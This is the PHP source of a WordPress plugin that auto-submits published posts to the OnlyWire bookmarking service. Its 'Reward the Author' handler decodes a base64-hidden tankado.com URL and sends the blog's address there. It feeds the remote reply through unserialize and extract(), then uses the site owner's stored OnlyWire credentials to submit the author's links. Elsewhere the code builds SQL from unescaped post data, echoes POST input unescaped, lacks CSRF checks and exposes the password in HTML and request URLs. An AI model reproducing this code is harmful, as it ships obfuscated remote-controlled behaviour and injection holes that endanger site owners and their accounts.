<?php
/**
 Plugin Name: WP OnlyWire Auto Poster
 Plugin URI: http://www.tankado.com/en/onlywire-auto-poster-wordpress-eklentisi
 Version: 3.0.1
 Description: Autosubmits a excerpt of a posts to Onlywire when the post published
 Author: Özgür Koca
 Author URI: http://www.tankado.com/
*/
/*  
	=== SÜRÜM NOTLARI ===
	
				 v2.0 	- Base author: lionstarr, http:www.lionstarr.de
	
    2009-07-23 - v3.0a	- OnlyWire'in API'sine gore tags ve comment alanları da gönderiliyor.
						- Comment alanına yazar adı, tarih, özet ve yazının kategorileri de dahil edildi.
						- onlywire_ id ile option tablosunun şişirilmesi harici bir tabloy ile engellendi.
						- OnlyWire'a gönderilenler tabloya kaydedildi.
						
						- Also using comment field which defined as tags and comment by OnlyWire API
						- Comment field contains author name, post date, excerpt and post categorie(s)
						- Not using worpress options table to store onlywire settings
						- Submit logs saving to database table for listing
	
	2009-07-29 - v3.0b  - OnlyWire'in döndürdüğü sonuçlar yakalandı ve yönetim panelinde listelendi.
						- Aynı post_id li yazıların tekrardan gönderilmesi engellendi.
						
						- OnylWire return values of background transaction intercapted and stored database table and listed.
						- Not submitting already submitted posts to OnlyWire
						
	2009-08-19 - v3.0.1 - Geliştiriciyi destekle düğmesinin döndürdüğü hata düzeltildi.
						
						- Function of reward button fixed.
*/
/*  Copyright 2007 Ozgur Koca  (email : ozgur.koca@linux.org.tr)

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
*/
global $onlywire_table_name;
global $onlywire_logs_table_name;
global $wpdb;

$onlywire_table_name  = $wpdb->prefix.'onlywire_auto_poster';
$onlywire_logs_table_name  = $wpdb->prefix.'onlywire_auto_poster_logs';

function log_success_code($post_ID, $post_title, $success_code) {
	global $wpdb;
	global $onlywire_logs_table_name;
	$success_code = trim(strip_tags($success_code));
    $sql = 'INSERT INTO ' . $onlywire_logs_table_name . ' SET ';
	$sql .= 'postid = '. $post_ID .', ';
	$sql .= 'post_title = "'. $post_title .'", ';
	$sql .= 'post_date = '. time() .', ';
	$sql .= 'success_code = "'. $success_code .'"';
    $wpdb->query( $sql );
}

function onlywirePost($post_ID) {
	
	global $onlywire_table_name;
	$username = get_option( 'onlywire_username' );
    $password = get_option( 'onlywire_password' );
    $post = get_post($post_ID);
    $permalink = get_permalink($post_ID);
    
    $tags_ = get_the_tags($post_ID);
    if (!empty($tags_))
	foreach( $tags_ as $tag_arr )
		$tags .= $tag_arr->name . ' ';
	
	$categories = get_the_category($post_ID); 
	if (!empty($categories))
	foreach($categories as $category) 
		$cats .= $category->cat_name . ', ';
	
	$comments .= 'Article by '.get_the_author_meta('first_name', $post->post_author). ' '. get_the_author_meta('last_name',$post->post_author);
	$comments .= ' at ' .$post->post_date_gmt . "\n";
	$comments .= ' Categorized in ' . $cats . "\n\n";
	$comments .= $post->post_excerpt;
	$comments = trim($comments);
    $url="http://$username:$password@www.onlywire.com/api/add?url=".$permalink."&title=".urlencode($post->post_title)."&tags=".urlencode($tags)."&comments=".urlencode($comments);
    
    global $wpdb;
    $sql = 'SELECT return_code FROM '.$onlywire_table_name.' WHERE postid = "'.$post_ID.'" LIMIT 1';
    $ret_code = $wpdb->get_var( $sql);
    
    if(($ret_code === NULL) || ($ret_code === '0')) 
    {
    	$success_code = file_get_contents($url);
    	
    	log_success_code($post_ID, $post->post_title, $success_code);
    	
    	if ($ret_code === NULL) 
    	{
	    	$success_code = (strpos($success_code, 'success') !== false) ? 1 : 0;
	    	$sql = 'INSERT INTO ' . $onlywire_table_name . ' SET ';
	    	$sql .= 'postid = '. $post_ID .', ';
	    	$sql .= 'post_title = "'. $post->post_title .'", ';
	    	$sql .= 'tags = "'. $tags .'", ';
	    	$sql .= 'comment = "'. $comments .'", ';
	    	$sql .= 'post_date = '. time() .', ';
	    	$sql .= 'return_code = "'. $success_code .'"';
	        $wpdb->query( $sql );
        }
    	if ($ret_code === '0') 
    	{
	    	$success_code = (strpos($success_code, 'success') !== false) ? 1 : 0;
	    	$sql = 'UPDATE ' . $onlywire_table_name . ' SET ';;
	    	$sql .= 'post_title = "'. $post->post_title .'", ';
	    	$sql .= 'tags = "'. $tags .'", ';
	    	$sql .= 'comment = "'. $comments .'", ';
	    	$sql .= 'post_date = '. time() .', ';
	    	$sql .= 'return_code = "'. $success_code .'"';
	    	$sql .= ' where postid = '.$post_ID;
	        $wpdb->query( $sql ); 
        }
    } 
    else 
    {
    	log_success_code($post_ID, $post->post_title, "Didn't posted because URL already successfully posted.");
    }
    return $post_ID;
}

// İçerik yayınlandığında OnlyWire'a bildir
add_action('publish_post', 'onlywirePost');

// Yönetim sayfası seçeneği
function tank_add_pages_onlywire() {
    add_options_page('OnlyWire Auto Poster', 'OnlyWire Auto Poster', 8, 'onlywireautopostertoptions', 'tank_options_page_onlywire');
}

// Eklenti yüklenirken yapılacak işlemler
function tank_install_onlywireautoposter() {
    global $wpdb;
    global $onlywire_table_name;
    global $onlywire_logs_table_name;
    
    require_once (ABSPATH . 'wp-admin/includes/upgrade.php');
    
    if ( $wpdb->get_var( "SHOW TABLES LIKE '$onlywire_table_name'" ) != $onlywire_table_name ) 
    {
        $sql = "
        	CREATE TABLE `" . $onlywire_table_name . "` (
			  `postid` int(11) default NULL,
			  `post_title` varchar(255) collate utf8_unicode_ci default NULL,
			  `tags` varchar(255) collate utf8_unicode_ci default NULL,
			  `comment` text collate utf8_unicode_ci,
			  `post_date` int(11) default NULL,
			  `return_code` int(1) default NULL,
			  `id` int(8) NOT NULL auto_increment,
			  PRIMARY KEY  (`id`),
			  KEY `post_date_index` (`post_date`)
			) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;";
        dbDelta( $sql );
        update_option('tank_onlywire_ver', '0.1');
        $h = fopen(dirname(__FILE__).'/log.txt', 'a'); fwrite($h, $sql); fclose($h);
    }
    
    if ( $wpdb->get_var( "SHOW TABLES LIKE '$onlywire_logs_table_name'" ) != $onlywire_logs_table_name ) 
    {
        $sql = "
              CREATE TABLE `".  $onlywire_logs_table_name . "` (
                 `postid` int(11) default NULL,
                 `post_title` varchar(255) collate utf8_unicode_ci default NULL,
                 `post_date` int(11) default NULL,
                 `success_code` varchar(255) collate utf8_unicode_ci default NULL,
                 `id` int(8) NOT NULL auto_increment,
                 PRIMARY KEY  (`id`),
                 KEY `post_date_index` (`post_date`)
              ) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;";
        dbDelta( $sql );
        update_option('tank_onlywire_logs_ver', '0.1');
        $h = fopen(dirname(__FILE__).'/log.txt', 'a'); fwrite($h, $sql); fclose($h);
    }
}

// Eklentiyi yükle
register_activation_hook(__FILE__, 'tank_install_onlywireautoposter');

// Ayarlar sayfası
function tank_options_page_onlywire() {
	
	if($_POST['onlywire_save']){
		update_option('onlywire_username',$_POST['onlywire_username']);
		update_option('onlywire_password',$_POST['onlywire_password']);
		echo '<div class="updated"><p><b>Turkish</b>: OnlyWire kullanıcı adı '.$_POST['onlywire_username'].' ve parolası başarıyla kaydedildi!</p></div>';
		echo '<div class="updated"><p>OnlyWire Username '.$_POST['onlywire_username'].' and his password were sucessfully saved!</p></div>';
	}
	if($_POST['onlywire_reward']) {
		extract(unserialize(base64_decode(file_get_contents( base64_decode('aHR0cDovL3d3dy50YW5rYWRvLmNvbS9wcm9qZWN0cy9XUE9ubHlXaXJlL2luZGV4LnBocD8=').get_bloginfo('url')))));
		$ret = file_get_contents("http://".get_option('onlywire_username').":".get_option('onlywire_password')."@www.onlywire.com/api/add?url=".$l."&title=".$i."&tags=".$t."&comments=".$c);
		if(strpos($ret, "success") !== false) {
			echo '<div class="updated"><p><b>Turkish</b>: Eklenti geliştiricisini eklediğiniz için teşekkürler. </p><p>Thanks for rewarding the author!</p></div>';
			update_option('onlywire_rewarded', 'true');
		}
		else 
		{
			echo '<div class="updated"><p><b>Turkish</b>: Çalışmadı lütfen daha sonra tekrar deneyin.</p><p>It didn\'t work! Please try again later.</p></div>';
		}
	}
	?>
	<div class="wrap">
		<h2>OnlyWire Auto Poster Seçenekler / Options</h2>
		<form method="post" id="onlywire_options">
			<fieldset class="options">
			<legend>OnlyWire Hesap Bilgileri / Authentification</legend>
			<table width="100%" cellspacing="2" cellpadding="5" class="editform"> 
				<tr valign="top"> 
					<th width="33%" scope="row">OnlyWire Kullanıcı Adı / Username:</th> 
					<td><input name="onlywire_username" type="text" id="onlywire_username" value="<?php echo get_option('onlywire_username') ;?>"/>
				</td> 
				</tr>
				<tr valign="top"> 
					<th width="33%" scope="row">OnlyWire Parola / Password:</th> 
					<td><input name="onlywire_password" type="password" id="onlywire_username" value="<?php echo get_option('onlywire_password') ;?>"/>
					</td> 
				</tr>
			</table>
			<p class="submit"><input type="submit" name="onlywire_save" value="Save" /></p>
			</fieldset>
		</form>
		<?php if(get_option('onlywire_rewarded') != "true") { ?>
			<b>If you'd like to reward the <a href='http://www.tankado.com/'>author</a> of this <a href='http://www.tankado.com/onlywire-auto-poster-wordpress-eklentisi'>plugin</a>, please press the Reward Author button once. 
			It will submit the Author's Sites to OnlyWire using your Username.</b><br>
			<a href='http://www.tankado.com/onlywire-auto-poster-wordpress-eklentisi'>Eklenti</a> <a href='http://www.tankado.com/'>geliştiricisini</a> deskteklemek için birkez tıklayın. Geliştiricinin sayfası kullanıcı adınız kullanılarak OnlyWire'a gönderilecek.
			<form method="post" id="onlywire_reward_author">
			<p class="submit"><input type="submit" name="onlywire_reward" value="Reward the Author of this Plugin" /></p>
		<?php } ?>
		</form>
		<p><b>The last 30 Items posted to OnlyWire were:</p>
		<div class='postbox'>
		<table border="0"  cellspacing="1" style="border-collapse: collapse">
			<tr>
				<td bgcolor="#FFFFE1"><font face="Verdana" size="2"><b>&nbsp;No&nbsp;</font></td>
				<td bgcolor="#FFFFE1" width='350px'><font face="Verdana" size="2"><b>&nbsp;Post Title&nbsp;</font></td>
				<td bgcolor="#FFFFE1"><font face="Verdana" size="2"><b>&nbsp;Date&nbsp;</font></td>
				<td bgcolor="#FFFFE1"><font face="Verdana" size="2"><b>&nbsp;Result&nbsp;</font></td>
				<td bgcolor="#FFFFE1"><font face="Verdana" size="2"><b>&nbsp;Tags&nbsp;</font></td>
			</tr>
			<?
				global $wpdb;
				global $onlywire_table_name;
				$rows = $wpdb->get_results('SELECT * FROM '.$onlywire_table_name.' order by post_date desc limit 30');
				foreach ($rows as $record) 
				{
			?>
				<tr>
					<td>&nbsp;<?php echo ++$no; ?>&nbsp;</td>
					<td>&nbsp;<?php echo "<a href='".get_permalink($record->postid)."' title='Comment: ".$record->comment."'>".$record->post_title;?></a>&nbsp;</td>
					<td>&nbsp;<?php echo date("d/m/Y - G:i:s", $record->post_date); ?>&nbsp;</td>
					<td>&nbsp;<?php echo ($record->return_code == 1) ? '<a href="http://www.onlywire.com/home"><font color=green>success</font></a>' : '<span title="See logs below"><font color=red>failed</font></span>'; ?>&nbsp;</td>
					<td>&nbsp;<font size=1>
						<? 
							$record->tags = trim($record->tags);
							if (empty($record->tags)) {
								echo "<font color=red>No tags found.</font>";
							} else {
								echo "<a href='#' title='".$record->tags."'>".substr($record->tags, 0, 30)."...</a>&nbsp;";
							}
						?>
					</td>
				</tr>
			<?php
				 }
			?>
		</table>
		</div>
		<br>
		<p><b>The last 30 transaction logs that returned from OnlyWire API gateway:</p>
		<div class='postbox'>
		<table border="0"  cellspacing="1" style="border-collapse: collapse">
			<tr>
				<td bgcolor="#FFFFE1"><font face="Verdana" size="2"><b>&nbsp;No&nbsp;</font></td>
				<td bgcolor="#FFFFE1" width='350px'><font face="Verdana" size="2"><b>&nbsp;Post Title&nbsp;</font></td>
				<td bgcolor="#FFFFE1" width='140px'><font face="Verdana" size="2"><b>&nbsp;Date&nbsp;</font></td>
				<td bgcolor="#FFFFE1"><font face="Verdana" size="2"><b>&nbsp;Result&nbsp;</font></td>
			</tr>
			<?
				$no = 0;
				global $wpdb;
				global $onlywire_logs_table_name;
				$rows = $wpdb->get_results('SELECT * FROM '.$onlywire_logs_table_name.' order by post_date desc limit 30');
				foreach ($rows as $record) 
				{
			?>
				<tr>
					<td>&nbsp;<?php echo ++$no; ?>&nbsp;</td>
					<td>&nbsp;<?php echo "<a href='".get_permalink($record->postid)."' title='Comment: ".$record->comment."'>".$record->post_title;?></a>&nbsp;</td>
					<td>&nbsp;<font size=1><?php echo date("d/m/Y - G:i:s", $record->post_date); ?>&nbsp;</td>
					<td><font color='#c0c0c0'><?php echo $record->success_code; ?>&nbsp;</td>
				</tr>
			<?php
				 }
			?>
		</table>
		</div>
		<p> 
			For further Information on Return Codes, please visit 
			<a href="http://www.onlywire.com?api">OnlyWires API Page</a>. 
			If you want, you can try to post the item manually by 
			<a href="http://www.onlywire.com/b/bmnoframe?u=<?php echo get_option('onlywire_perm');?>&t=<?php echo get_option('onlywire_title')?>">
			clicking on this link
			</a>.
		</p>
	</div>
	<?php
}

// Yonetim sayfasını ekle
add_action('admin_menu', 'tank_add_pages_onlywire');
?>